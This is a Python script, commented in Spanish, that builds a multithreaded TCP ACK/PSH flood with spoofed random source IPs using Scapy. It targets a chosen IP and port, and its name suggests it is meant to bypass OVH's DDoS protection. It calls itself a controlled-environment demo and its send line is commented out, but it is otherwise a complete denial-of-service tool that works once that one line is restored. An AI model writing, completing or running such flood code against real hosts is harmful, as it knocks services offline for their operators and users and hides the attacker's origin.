# ovh_bypass.py (Script de demostración para entorno controlado)

import sys
import threading
import time
import random
import socket
from scapy.all import IP, TCP, send

# Genera una dirección IP aleatoria (para simular spoofing)
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Genera un puerto de origen aleatorio
def random_port():
    return random.randint(1024, 65535)

# Función principal que ejecuta cada hilo
def flood_worker(target_ip, target_port, duration):
    # Simula el "limiter" y el "packetsPerSecond" del código C
    packet_counter = 0
    start_time = time.time()
    
    while time.time() < start_time + duration:
        try:
            # 1. Construcción de la Capa IP
            ip_layer = IP(
                src=random_ip(),          # Simula la IP aleatoria (spoofing)
                dst=target_ip,
                ttl=random.randint(64, 255)
            )
            
            # 2. Construcción de la Capa TCP (ACK/PSH como en el código C)
            # El código C usa flags 'ACK' y 'PSH'
            tcp_layer = TCP(
                sport=random_port(),      # Puerto de origen aleatorio
                dport=target_port,
                flags='AP',               # PSH (Push) + ACK (Acknowledgement)
                seq=random.randint(0, 4294967295), # Número de secuencia aleatorio
                ack=random.randint(0, 4294967295),  # ACK de secuencia aleatorio
                window=random.randint(1000, 65535)
            )
            
            # 3. Datos (Payload)
            # El código C usa un payload aleatorio entre 90 y 120 bytes
            random_payload = "A" * random.randint(90, 120)
            
            # 4. Combinar y Enviar el Paquete
            packet = ip_layer / tcp_layer / random_payload
            
            # El uso de Scapy se encarga de calcular automáticamente el Checksum (csum)
            # send(packet, verbose=0) # Usar verbose=0 para un envío silencioso
            
            # Para demostración, solo imprimimos
            # print(f"Enviado: {ip_layer.src}:{tcp_layer.sport} -> {target_ip}:{target_port}")
            
            packet_counter += 1
            
            # Control de velocidad (simulando sleep/limiter)
            # time.sleep(0.0001) # Descomentar para reducir la velocidad en la prueba

        except Exception as e:
            # print(f"Error en el hilo: {e}")
            pass

    print(f"Hilo finalizado. Total de paquetes simulados: {packet_counter}")

# Función principal de ejecución del script
def attack(ip: str, port: int, duration: int, threads: int = 100):
    if duration <= 0:
        print("El tiempo de duración debe ser positivo.")
        return

    print(f"Iniciando Prueba (Scapy) 🚀\nIP: {ip}\nPuerto: {port}\nTiempo: {duration}s\nHilos: {threads}")

    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(ip, port, duration))
        thread_list.append(t)
        t.start()
        # Pequeño retraso para asegurar que los hilos no comiencen exactamente a la vez
        # time.sleep(0.01) 

    for t in thread_list:
        t.join()

    print(f"Prueba de inundación a {ip}:{port} finalizada.")


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Uso: python3 script_ovh.py <target IP> <port> <threads> <time>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    attack_time = int(sys.argv[4])
    
    # Llama a la función de ataque
    attack(target_ip, target_port, attack_time, num_threads)

